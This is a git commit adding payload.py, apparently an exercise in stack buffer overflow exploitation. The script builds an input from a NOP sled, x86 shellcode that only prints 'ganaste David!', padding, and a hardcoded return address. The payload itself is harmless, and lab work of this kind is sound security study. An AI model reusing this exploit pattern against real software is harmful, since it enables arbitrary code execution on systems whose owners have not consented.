5d7305fb76500ead12e0157bc8aefbe7afc7dbe9
Guashasha <92059195+Guashasha@users.noreply.github.com>
2025-04-06 16:57:45 -0600

    Add files via upload

---
+++ payload.py
@@ -0,0 +1,13 @@
+from struct import pack
+
+shellcode = "\xeb\x11\x59\xb0\x04\x31\xdb\x43\x31\xd2\xb2\x0f\xcd\x80\xb0\x01\x4b\xcd\x80\xe8\xea\xff\xff\xff\x67\x61\x6e\x61\x73\x74\x65\x20\x44\x61\x76\x69\x64\x21\x0b"
+
+ret_addr = 0xbffff620
+
+output = "\x90" * 20
+output += shellcode
+output += "A" * (80 - 20 - len(shellcode))
+output += "BBBBBBBB"
+output += pack("<I", ret_addr)
+
+print(output)
